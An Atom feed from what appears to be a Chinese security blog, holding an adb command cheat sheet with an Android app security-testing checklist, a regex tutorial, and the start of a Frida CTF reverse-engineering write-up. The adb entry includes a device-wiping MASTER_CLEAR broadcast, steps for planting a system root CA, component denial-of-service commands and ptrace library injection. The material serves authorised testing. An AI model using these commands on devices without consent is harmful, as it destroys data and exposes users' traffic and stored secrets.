<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ol4three</title>
  
  <subtitle>一个专注于信息安全技术的白帽子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.ol4three.com/"/>
  <updated>2021-01-05T13:25:37.056Z</updated>
  <id>http://www.ol4three.com/</id>
  
  <author>
    <name>ol4three</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>adb使用整理</title>
    <link href="http://www.ol4three.com/2021/01/05/Android/adb%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/"/>
    <id>http://www.ol4three.com/2021/01/05/Android/adb%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/</id>
    <published>2021-01-05T13:19:41.000Z</published>
    <updated>2021-01-05T13:25:37.056Z</updated>
    
    <content type="html"><![CDATA[<h2 id="adb使用"><a href="#adb使用" class="headerlink" title="adb使用"></a>adb使用</h2><h3 id="adb连接"><a href="#adb连接" class="headerlink" title="adb连接"></a>adb连接</h3><pre><code>adb connect ip:5555adb devicesadb -s device-id shell  //指定某个设备(插充电设备或USB网络时)// 查看网络状态adb shell netstat// 通过 tcp/ip 连接，默认端口 5555adb connect host:port// 转发套接字连接adb forward local remote</code></pre><h3 id="adb-截图发送到当前用户目录下"><a href="#adb-截图发送到当前用户目录下" class="headerlink" title="adb 截图发送到当前用户目录下"></a>adb 截图发送到当前用户目录下</h3><pre><code>adb exec-out screencap -p &gt; 1.png</code></pre><h3 id="adb文件导出-导入"><a href="#adb文件导出-导入" class="headerlink" title="adb文件导出/导入"></a>adb文件导出/导入</h3><h4 id="从电脑上复制文件到设备"><a href="#从电脑上复制文件到设备" class="headerlink" title="从电脑上复制文件到设备"></a>从电脑上复制文件到设备</h4><pre><code>// 把 a.png 从电脑上拷贝到设备sd卡上adb push ~/a.png /mnt/sdcard/// 把 a.png 从电脑上拷贝到设备sd卡上并重命名为 b.pngadb push ~/a.png /mnt/sdcard/b.png</code></pre><p>​    </p><pre><code>// 把 pic目录下所有文件从电脑上拷贝到设备sd卡上adb push ~/pic/ /mnt/sdcard/</code></pre><h4 id="从设备复制文件到电脑"><a href="#从设备复制文件到电脑" class="headerlink" title="从设备复制文件到电脑"></a>从设备复制文件到电脑</h4><pre><code>// 把 a.png 从设备sd卡上拷贝到电脑上adb pull /mnt/sdcard/a.png ~/// 把 a.png 从设备sd卡上拷贝到电脑上并命名为b.pngadb pull /mnt/sdcard/a.png ~/b.png// 把pics目录下所有文件从设备sd卡上拷贝到电脑上adb pull /mnt/sdcard/pics/ ~/pics/</code></pre><p>​    </p><h4 id="一些基本命令"><a href="#一些基本命令" class="headerlink" title="一些基本命令"></a>一些基本命令</h4><pre><code>// 列出sd卡根目录下所有文件adb shell ls /sdcard/// 定位到 /sdcard/目录adb shell cd /sdcard/// 删除某文件// -f 强制删除文件不需要确认// -r 递归删除文件夹内文件// -i 删除文件前需要确认adb shell rm /sdcard/1.txt// 创建目录adb shell mkdir /sdcard/temp/// 指定 -p 递归创建目录adb shell mkdir -p  /sdcard/temp/test/abc/hello/// 创建文件adb shell touch /sdcard/1.txt// 显示当前所在目录adb shell pwd// 拷贝文件1.txt到test目录adb shell cp /sdcard/1.txt /sdcard/test/// 移动文件，移动同一目录下文件相当于重命名文件adb shell mv /sdcard/1.txt /sdcard/2.text</code></pre><h3 id="adb修改手机代理"><a href="#adb修改手机代理" class="headerlink" title="adb修改手机代理"></a>adb修改手机代理</h3><h4 id="全局代理"><a href="#全局代理" class="headerlink" title="全局代理"></a>全局代理</h4><pre><code>设置代理：adb shell settings put global http_proxy 代理IP地址:端口号如：adb shell settings put global http_proxy 192.168.137.97:8888移除代理：adb shell settings delete global http_proxyadb shell settings delete global global_http_proxy_hostadb shell settings delete global global_http_proxy_port</code></pre><h4 id="证书安装"><a href="#证书安装" class="headerlink" title="证书安装"></a>证书安装</h4><blockquote><p>手机获取Root权限后，直接把Base64文本格式的根证书文件复制到etc/security/cacerts文件夹里，然后到设置(Settings) – 安全(Security) – 受信任的凭据(Trusted credentials)里面，此时你要安装的根证书应该会显示已经安装好了。这样安装之后根证书是作为系统证书使用的，而不是按照方法一安装方式的用户证书。</p></blockquote><p>.cer（非.crt）格式文件</p><p><a href="http://wiki.cacert.org/FAQ/ImportRootCert#CAcert_user_trusted_certificates">http://wiki.cacert.org/FAQ/ImportRootCert#CAcert_user_trusted_certificates</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a. openssl x509 -inform DER -subject_hash_old -in CA_Name.cer    | head -1</span><br><span class="line">得到类似字符串：9a5ba575</span><br><span class="line">b.cat CA_Name.cer  &gt; 9a5ba575.0</span><br><span class="line">c.openssl x509 -inform DER -text -in CA_Name.cer    -out &#x2F;dev&#x2F;null &gt;&gt; 9a5ba575.0</span><br><span class="line">d.放入&#x2F;system&#x2F;ca-certificates&#x2F;files&#x2F;</span><br><span class="line">实际测试，可能会报错，报错后不管格式，DER 换成PEM 试试</span><br><span class="line">编译到：&#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;</span><br><span class="line">e:烧录重启验证</span><br></pre></td></tr></table></figure><p><a href="http://wiki.cacert.org/FAQ/ImportRootCert#CAcert_user_trusted_certificates">http://wiki.cacert.org/FAQ/ImportRootCert#CAcert_user_trusted_certificates</a></p><p>Fiddler默认是cer证书，如何转为pem呢？指令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform der -in abc.cer -out out.pem</span><br></pre></td></tr></table></figure><p><a href="https://segmentfault.com/a/1190000017035564">https://segmentfault.com/a/1190000017035564</a><br>解决只读文件无法写入的问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb remount</span><br><span class="line">adb shell</span><br><span class="line">chmod 777 system</span><br></pre></td></tr></table></figure><h4 id="第三方apk"><a href="#第三方apk" class="headerlink" title="第三方apk"></a>第三方apk</h4><p>AndroidProxySetter工具可以帮助我们使用adb命令可以快速进行wifi代理的设置和清除<br>GitHub地址：</p><pre><code>https://github.com/jpkrause/AndroidProxySetter</code></pre><p>下好apk后，安装到手机</p><pre><code>adb install proxy-setter-debug-0.2.1.apk</code></pre><p>设置代理：</p><p>adb shell am start -n tk.elevenk.proxysetter/.MainActivity -e host 代理IP地址 -e port 端口号 -e ssid WIFI名称 -e reset-wifi true -e key WIFI密码</p><p>如：</p><p>adb shell am start -n tk.elevenk.proxysetter/.MainActivity -e host 127.0.0.1 -e port 8888 -e ssid YOUR-WIFI-NAME -e reset-wifi true -e key YOUR-WIFI-PASSWORD</p><h4 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h4><pre><code>// 列出进程列表 ，其中包含进程的 pid 等信息adb shell ps// 杀死指定pid的进程adb shell kill pid// 查看指定进程信息adb shell ps -x pid </code></pre><p>​    </p><h3 id="apk管理"><a href="#apk管理" class="headerlink" title="apk管理"></a>apk管理</h3><h4 id="adb导出（手机apk到电脑）"><a href="#adb导出（手机apk到电脑）" class="headerlink" title="adb导出（手机apk到电脑）"></a>adb导出（手机apk到电脑）</h4><pre><code>1、adb shell pm list package打印出来所有安装到手机上的APP包名adb shell pm list package com.huawei.   //查找包含com.huawei的包2、adb shell pm path com.xxx.xxx找出安装后的包名应用的apk所在位置3、adb pull path_apk  out_apkpath_apk为apk在手机上的目录，即2中的apk在手机中的目录，out_apk为导出apk的目标路径。4、通过adb命令查看Android手机已安装应用的版本号versionCode和versionNameadb shell dumpsys package  [PackageName] | findstr versionCodeadb shell dumpsys package  [PackageName] | findstr versionName</code></pre><h3 id="日志输出"><a href="#日志输出" class="headerlink" title="日志输出"></a>日志输出</h3><pre><code>// 查看指定 tag 日志adb logcat -s tag// 清除log缓存adb logcat -c</code></pre><h3 id="启动activity"><a href="#启动activity" class="headerlink" title="启动activity"></a>启动activity</h3><pre><code>// 启动应用// -n 指定包名/包名+启动类的类名 ，启动类的类名必须是完整路径adb shell am start -n package/package-activity// 停止应用adb shell am force-stop package// 启动 serviceadb shell am startservice [options] &lt;INTENT&gt;举例：adb shell am startservice -a com.lt.test.action.ONESERVICE举例：adb shell am startservice -n com.lt.test/.MyService// 发送广播adb shell am broadcast [options] &lt;INTENT&gt;// 发送一个广播去关闭一个activityadb shell am broadcast -a &quot;action_finish&quot; // 恢复出厂设置的方法，会清除内存所有内容adb shell am broadcast -a android.intent.action.MASTER_CLEARadb shell am broadcast -n com.lt.test/.MyBroadcast// 列举出所有包含&lt;INTENT&gt;的packageadb shell pm list packages [options] &lt;INTENT&gt;adb shell pm list packages com.lt</code></pre><p>​    </p><h3 id="管理安装包"><a href="#管理安装包" class="headerlink" title="管理安装包"></a>管理安装包</h3><pre><code>adb shell pm安装应用程序adb install xxx.apk// 覆盖安装(保留缓存和数据)adb install -r xxx.apk// 安装apk到sd卡adb install -s xxx.apk卸载应用程序adb uninstall package// 卸载时保留数据和缓存目录adb uninstall -k package</code></pre><p>​    </p><pre><code>列出设备上的所有权限adb shell pm list permissions列出设备上安装的所有app的包名adb shell pm list packages// 列出指定包名对应的apk路径adb shell pm path com.android.search// 清空指定包名对应的应用的数据和缓存文件，开发时很有用adb shell pm clear com.android.search</code></pre><p>​    </p><pre><code>列出设备上的所有featureadb shell pm list features</code></pre><h3 id="adb安装证书"><a href="#adb安装证书" class="headerlink" title="adb安装证书"></a>adb安装证书</h3><p>adb shell am start -n com.android.certinstaller/.CertInstallerMain -a android.intent.action.VIEW -t application/x-x509-ca-cert file:///sdcard/cacert.cer</p><p>参考：<a href="https://www.jianshu.com/p/f547b05a5335">https://www.jianshu.com/p/f547b05a5335</a></p><h3 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h3><pre><code>// 获取系统属性，可以获取到一大堆关于系统信息（键值对形式）adb shell getprop // 获取系统属性并过滤出包含version的信息adb shell getprop | grep version</code></pre><p>​    </p><pre><code>查看 cpu 和 内存使用情况// 每隔一秒会刷新一次 cpu 和 内存情况adb shell top// 查看占用内存前3的应用adb shell top -m 3// 刷新3次内存信息（不指定-n参数的话默认每秒会刷新1次数据）：adb shell top -n 3// 查看占用内存前3的应用，刷新1次adb shell top -m 3 -n 1</code></pre><p>​    </p><pre><code>查看系统当前 cpu 使用情况adb shell cat /proc/cpuinfoadb shell cat /proc/stat查看系统当前内存使用情况adb shell cat /proc/meminfo查看指定包名应用内存使用情况，各项信息具体说明adb shell dumpsys meminfo package</code></pre><p>​    </p><pre><code>查看 serviceadb shell service listadb shell cat /system/build.prop电池相关// 查看电量管理信息，其中可以知道当前那个应用持有WAKE_LOCK锁adb shell dumpsys power// 查看电池用量情况adb shell dumpsys battery// 查看电池使用日志adb shell dumpsys batterystats图形界面日志分析参考google提供的工具 https://github.com/google/battery-historian</code></pre><h3 id="查看当前activity"><a href="#查看当前activity" class="headerlink" title="查看当前activity"></a>查看当前activity</h3><pre><code>logcat | grep ActivityManageradb shell dumpsys activity activitiesadb shell dumpsys activity activities | findstr &quot;应用包名&quot; 过滤字符串忽略大小写 : adb logcat | grep -i wifi ;过滤固定字符串 : 只要命令行出现的日志都可以过滤, 不管是不是标签;-- 命令 : adb logcat | grep Wifi ;</code></pre><h2 id="APP安全测试"><a href="#APP安全测试" class="headerlink" title="APP安全测试"></a>APP安全测试</h2><h3 id="组件安全"><a href="#组件安全" class="headerlink" title="组件安全"></a>组件安全</h3><h4 id="activity-是否ddos"><a href="#activity-是否ddos" class="headerlink" title="activity 是否ddos"></a>activity 是否ddos</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -S -n 包名&#x2F;Activity名</span><br></pre></td></tr></table></figure><h4 id="BroadcastReceiver拒绝服务"><a href="#BroadcastReceiver拒绝服务" class="headerlink" title="BroadcastReceiver拒绝服务"></a>BroadcastReceiver拒绝服务</h4><p>查看AndroidManifest.xml是否存在Receiver导出<br>利用adb命令启动被导出的Receiver</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am broadcast –n pachage_name&#x2F;receiver_name</span><br></pre></td></tr></table></figure><h4 id="service拒绝服务"><a href="#service拒绝服务" class="headerlink" title="service拒绝服务"></a>service拒绝服务</h4><p>查看AndroidManifest.xml是否存在Service导出<br>利用adb命令启动被导出的Service</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start service –n pachage_name&#x2F;service_name</span><br></pre></td></tr></table></figure><h4 id="Provider目录遍历"><a href="#Provider目录遍历" class="headerlink" title="Provider目录遍历"></a>Provider目录遍历</h4><p>查看Provider是否导出<br>查看反编译代码,检查OpenFile函数中是否包含路径校验逻辑</p><h4 id="Ptrace注入"><a href="#Ptrace注入" class="headerlink" title="Ptrace注入"></a>Ptrace注入</h4><p>检测方法一：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">推送inject和libpayload.so到手机&#x2F;data&#x2F;local&#x2F;tmp中</span><br><span class="line">为inject添加执行权限</span><br><span class="line">执行注入命令inject 进程名 &#x2F;data&#x2F;local&#x2F;tmp&#x2F;libpayload.so 任意字符串</span><br><span class="line">adb logcat -s 360Inject抓取日志分析是否注入成功</span><br></pre></td></tr></table></figure><p>检测方法二：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -U -i &quot;recv*&quot;  -f 包名</span><br><span class="line">cat &#x2F;proc&#x2F;PID&#x2F;maps |grep frida</span><br></pre></td></tr></table></figure><h4 id="SharedPreferences明文保存敏感信息"><a href="#SharedPreferences明文保存敏感信息" class="headerlink" title="SharedPreferences明文保存敏感信息"></a>SharedPreferences明文保存敏感信息</h4><p>跳转到app的数据目录</p><p>查看所有xml文件,检测是否包含敏感数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">cd &#x2F;data&#x2F;data&#x2F;package_name&#x2F;hared_prefs&#x2F;</span><br></pre></td></tr></table></figure><p>查看所有xml文件,检测是否包含敏感数据</p><h4 id="SQLite明文保存敏感信息"><a href="#SQLite明文保存敏感信息" class="headerlink" title="SQLite明文保存敏感信息"></a>SQLite明文保存敏感信息</h4><p>跳转到app的database目录</p><p>查看所有db文件,检测是否包含敏感数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">cd &#x2F;data&#x2F;data&#x2F;package_name&#x2F;database&#x2F;</span><br></pre></td></tr></table></figure><p>查看所有db文件,检测是否包含敏感数据</p><h4 id="log敏感信息检测"><a href="#log敏感信息检测" class="headerlink" title="log敏感信息检测"></a>log敏感信息检测</h4><p>使用logcat命令抓取log</p><p>分析日志中是否包含敏感信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell adb logcat &gt; logfile.log</span><br></pre></td></tr></table></figure><p>分析日志中是否包含敏感信息</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;adb使用&quot;&gt;&lt;a href=&quot;#adb使用&quot; class=&quot;headerlink&quot; title=&quot;adb使用&quot;&gt;&lt;/a&gt;adb使用&lt;/h2&gt;&lt;h3 id=&quot;adb连接&quot;&gt;&lt;a href=&quot;#adb连接&quot; class=&quot;headerlink&quot; title=&quot;adb
      
    
    </summary>
    
    
      <category term="Android" scheme="http://www.ol4three.com/categories/Android/"/>
    
    
      <category term="adb" scheme="http://www.ol4three.com/tags/adb/"/>
    
  </entry>
  
  <entry>
    <title>正则小技巧和数据过滤处理</title>
    <link href="http://www.ol4three.com/2021/01/05/WEB/%E6%AD%A3%E5%88%99%E5%B0%8F%E6%8A%80%E5%B7%A7%E5%92%8C%E6%95%B0%E6%8D%AE%E8%BF%87%E6%BB%A4%E5%A4%84%E7%90%86/"/>
    <id>http://www.ol4three.com/2021/01/05/WEB/%E6%AD%A3%E5%88%99%E5%B0%8F%E6%8A%80%E5%B7%A7%E5%92%8C%E6%95%B0%E6%8D%AE%E8%BF%87%E6%BB%A4%E5%A4%84%E7%90%86/</id>
    <published>2021-01-05T12:41:39.000Z</published>
    <updated>2021-01-05T13:20:31.289Z</updated>
    
    <content type="html"><![CDATA[<h2 id="正则基础"><a href="#正则基础" class="headerlink" title="正则基础"></a>正则基础</h2><blockquote><p>首先讲一下正则的规则只需要管What How即可 其他无需考虑</p></blockquote><h3 id="匹配字符-What"><a href="#匹配字符-What" class="headerlink" title="匹配字符(What)"></a>匹配字符(What)</h3><ul><li><code>.</code></li><li><code>[abcd]</code> <code>[a-zA-Z]</code> <code>[^abcd]</code></li><li><code>\d</code> <code>\s</code> <code>\t</code> <code>\w</code> …</li></ul><h3 id="匹配数量-How"><a href="#匹配数量-How" class="headerlink" title="匹配数量(How)"></a>匹配数量(How)</h3><ul><li><code>*</code></li><li><code>+</code></li><li><code>?</code></li><li><code>&#123;n&#125;</code></li><li><code>&#123;n,&#125;</code></li><li><code>&#123;n,m&#125;</code></li></ul><h3 id="子匹配"><a href="#子匹配" class="headerlink" title="子匹配"></a>子匹配</h3><ul><li><code>()</code></li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li><code>a*</code> Greedy 贪婪</li><li><code>a*?</code> Lazy</li><li><code>|</code> 或</li><li><code>^</code> <code>$</code></li></ul><h2 id="用法1"><a href="#用法1" class="headerlink" title="用法1"></a>用法1</h2><p>使用数据如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">2wangwei200falsefalse791true</span><br><span class="line">8wangjing200falsefalse791true</span><br><span class="line">72lihong200falsefalse791true</span><br><span class="line">94wangxin200falsefalse791true</span><br><span class="line">107liujuan200falsefalse791true</span><br><span class="line">119zhangbo200falsefalse791true</span><br><span class="line">145zhanghao200falsefalse791true</span><br><span class="line">169zhangbin200falsefalse791true</span><br><span class="line">185wangjing200falsefalse791true</span><br><span class="line">224liuxin200falsefalse791true</span><br><span class="line">260yanglin200falsefalse790true</span><br><span class="line">354likai200falsefalse791true</span><br><span class="line">390lixiang200falsefalse791true</span><br><span class="line">435zhangbo200falsefalse791true</span><br><span class="line">436wangxin200falsefalse791true</span><br></pre></td></tr></table></figure><p>推荐一个网站</p><p><a href="https://regex101.com/">https://regex101.com/</a></p><p>打开进行正则匹配</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105210427307.png" alt="image-20210105210427307" style="zoom:50%;"><p>直接生成Python脚本</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105210557490.png" alt="image-20210105210557490"></p><p>复制对应代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"># coding&#x3D;utf8</span><br><span class="line"># the above tag defines encoding for this document and is for Python 2.x compatibility</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">regex &#x3D; r&quot;(\d+\s+)(\w+)(\s\d+\s\w+\s\w+\s\d+\s\w+)&quot;</span><br><span class="line"></span><br><span class="line">test_str &#x3D; (&quot;2  wangwei 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;8  wangjing    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;72 lihong  200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;94 wangxin 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;107    liujuan 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;119    zhangbo 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;145    zhanghao    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;169    zhangbin    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;185    wangjing    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;224    liuxin  200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;260    yanglin 200 false   false   790 true    \n&quot;</span><br><span class="line">    &quot;354    likai   200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;390    lixiang 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;435    zhangbo 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;436    wangxin 200 false   false   791 true    &quot;)</span><br><span class="line"></span><br><span class="line">matches &#x3D; re.finditer(regex, test_str, re.MULTILINE)</span><br><span class="line"></span><br><span class="line">for matchNum, match in enumerate(matches, start&#x3D;1):</span><br><span class="line">    </span><br><span class="line">    print (&quot;Match &#123;matchNum&#125; was found at &#123;start&#125;-&#123;end&#125;: &#123;match&#125;&quot;.format(matchNum &#x3D; matchNum, start &#x3D; match.start(), end &#x3D; match.end(), match &#x3D; match.group()))</span><br><span class="line">    </span><br><span class="line">    for groupNum in range(0, len(match.groups())):</span><br><span class="line">        groupNum &#x3D; groupNum + 1</span><br><span class="line">        </span><br><span class="line">        print (&quot;Group &#123;groupNum&#125; found at &#123;start&#125;-&#123;end&#125;: &#123;group&#125;&quot;.format(groupNum &#x3D; groupNum, start &#x3D; match.start(groupNum), end &#x3D; match.end(groupNum), group &#x3D; match.group(groupNum)))</span><br><span class="line"></span><br><span class="line"># Note: for Python 2.7 compatibility, use ur&quot;&quot; to prefix the regex and u&quot;&quot; to prefix the test string and substitution.</span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># coding&#x3D;utf8</span><br><span class="line"># the above tag defines encoding for this document and is for Python 2.x compatibility</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">regex &#x3D; r&quot;(\d+\s+)(\w+)(\s\d+\s\w+\s\w+\s\d+\s\w+)&quot;</span><br><span class="line"></span><br><span class="line">test_str &#x3D; (&quot;2  wangwei 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;8  wangjing    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;72 lihong  200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;94 wangxin 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;107    liujuan 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;119    zhangbo 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;145    zhanghao    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;169    zhangbin    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;185    wangjing    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;224    liuxin  200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;260    yanglin 200 false   false   790 true    \n&quot;</span><br><span class="line">    &quot;354    likai   200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;390    lixiang 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;435    zhangbo 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;436    wangxin 200 false   false   791 true    &quot;)</span><br><span class="line"></span><br><span class="line">matches &#x3D; re.finditer(regex, test_str, re.MULTILINE)</span><br><span class="line"></span><br><span class="line">for i in matches:</span><br><span class="line">    print(i.group(2))</span><br></pre></td></tr></table></figure><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105210650979.png" alt="image-20210105210650979" style="zoom:50%;"><h2 id="用法2"><a href="#用法2" class="headerlink" title="用法2"></a>用法2</h2><p>使用vim进行正则匹配</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:s&#x2F;abc&#x2F;def&#x2F;g 用def替换abc，g为global全局的意思</span><br><span class="line">%s&#x2F;200.*&#x2F;&#x2F;g</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105210939127.png" alt="image-20210105210939127"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%s&#x2F;\(\d\+\s\)&#x2F;&#x2F;g</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105210951458.png" alt="image-20210105210951458"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;正则基础&quot;&gt;&lt;a href=&quot;#正则基础&quot; class=&quot;headerlink&quot; title=&quot;正则基础&quot;&gt;&lt;/a&gt;正则基础&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;首先讲一下正则的规则只需要管What How即可 其他无需考虑&lt;/p&gt;
&lt;/blockquote&gt;
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="正则" scheme="http://www.ol4three.com/tags/%E6%AD%A3%E5%88%99/"/>
    
  </entry>
  
  <entry>
    <title>Frida--Android逆向之动态加载dex Hook(上)</title>
    <link href="http://www.ol4three.com/2021/01/05/Android/frida/Frida-Android%E9%80%86%E5%90%91%E4%B9%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDdex-Hook-%E4%B8%8A/"/>
    <id>http://www.ol4three.com/2021/01/05/Android/frida/Frida-Android%E9%80%86%E5%90%91%E4%B9%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDdex-Hook-%E4%B8%8A/</id>
    <published>2021-01-05T07:57:36.000Z</published>
    <updated>2021-01-05T13:25:47.039Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Mac Os 10.15.5</span><br><span class="line">Python 3.9</span><br><span class="line">jeb</span><br><span class="line">jadx</span><br><span class="line">frida</span><br><span class="line">apktool</span><br><span class="line">MUMU模拟器</span><br></pre></td></tr></table></figure><blockquote><p>文章使用的是DDCTF2018的android逆向第二题Hello Baby Dex</p></blockquote><p>示例地址：[下载](<a href="https://github.com/ghostmaze/Android-Reverse/blob/master/Hello">https://github.com/ghostmaze/Android-Reverse/blob/master/Hello</a> Baby Dex/app-release.apk)</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Robust热修复框架原理</span><br><span class="line">Java 反射</span><br><span class="line">Robust类 hook</span><br><span class="line">frida基础hook</span><br></pre></td></tr></table></figure><h2 id="APK安装"><a href="#APK安装" class="headerlink" title="APK安装"></a>APK安装</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105160817336.png" alt="image-20210105160817336" style="zoom:50%;"><p>输入字符并验证，错误会Toast出一些信息，可能输入正确的值才能过获取flag直接进入分析</p><h2 id="静态代码分析"><a href="#静态代码分析" class="headerlink" title="静态代码分析"></a>静态代码分析</h2><p>导入jeb中查看AndroidManifest.xml 找到程序的入口MainActivity</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 